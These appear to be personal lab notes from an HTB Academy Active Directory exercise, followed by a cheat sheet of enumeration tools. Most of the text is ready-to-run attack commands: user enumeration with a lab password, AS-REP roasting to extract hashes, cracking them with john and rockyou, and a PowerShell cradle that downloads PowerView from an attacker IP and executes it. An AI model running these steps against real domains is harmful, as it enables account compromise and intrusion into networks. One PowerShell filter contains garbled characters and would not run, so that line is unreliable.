 nxc ldap 10.0.2.4 -u lfoster -p 'Pindrop#1' --users
 
impacket-GetNPUsers hack-academy.local/ -dc-ip 10.0.2.4 -usersfile users -outputfile hashes.txt

with this, we see ADIAZ which bloodhound says is vulnerable, is indeed vulnerable.

-k for keberoastable

nxc ldap 10.0.2.4 -u l foster -p 'Pindrop#1' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
nxc ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4

reveals users that are vulnerable to asreproast attack

nxc ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4 --asrep hash

cat hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
 
 several powerful alternatives to BloodHound for enumerating Active Directory users in HTB Academy AD chain scenarios, ranging from native PowerShell cmdlets to LDAP-based tools. 

1. PowerShell Enumeration (On-Target)

If you have a shell (e.g., `evil-winrm`), you can use native PowerShell AD cmdlets to identify users, groups, and permissions.

- **List all users:** `Get-ADUser -Filter * | Select-Object Name`
- **List members of "Domain Users":** `Get-ADGroupMember "Domain Users" | Select-Object Name`
- **Count all users:** `(Get-ADGroupMember "Domain Users" | Select-Object -ExpandProperty Name).Count`
- **Find users with specific privileges:** `Get-ADObject -Filter 'Object權限' -Properties *` (e.g., searching for specific ACLs) 

2. LDAP Enumeration (Off-Target) 

If you have a set of valid credentials, you can use LDAP queries from your Kali machine to enumerate the domain.

- **`windapsearch`:** A Python tool to find users, groups, and computers.
    - `python3 windapsearch.py -d inlanefreight.local --dc-ip <IP> -u <user> -p <pass> --users`
- **`ldapsearch`:** Native LDAP client.
    - `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=LOCAL" "(&(objectClass=user)(sAMAccountName=*))"`
- **`enum4linux`:** Good for RID cycling to identify users if null sessions are allowed, or with credentials.
    - `enum4linux -u -o <IP>` 

3. PowerView (On-Target PowerShell)

PowerView is a classic AD enumeration module within PowerSploit.

- **Download/Load:** `IEX (New-Object Net.WebClient).DownloadString('http://<IP>/PowerView.ps1')`
- **Get Users:** `Get-DomainUser -Identity *`
- **Get Group Members:** `Get-DomainGroupMember -Identity "Domain Admins"` 

4. Other AD Auditing Tools

- **`ADRecon`:** Gathers information and generates reports on AD, which can help map users without needing a graphical BloodHound representation.
- **`netexec` (formerly CrackMapExec):** Used for spraying and enumerating users.
    - `netexec smb <IP> -u users.txt -p 'password' --shares` 

Summary Comparison

|Tool|Type|Best For|
|---|---|---|
|**Get-ADUser**|Native PS|Quick on-target info (requires AD modules)|
|**PowerView**|Script|In-depth on-target enumeration|
|**windapsearch**|Python|Off-target enumeration (requires credentials)|
|**ldapsearch**|Native|Quick off-target queries|

These techniques allow you to find the same information that BloodHound provides (user lists, group memberships, and ACLs) to map out attack paths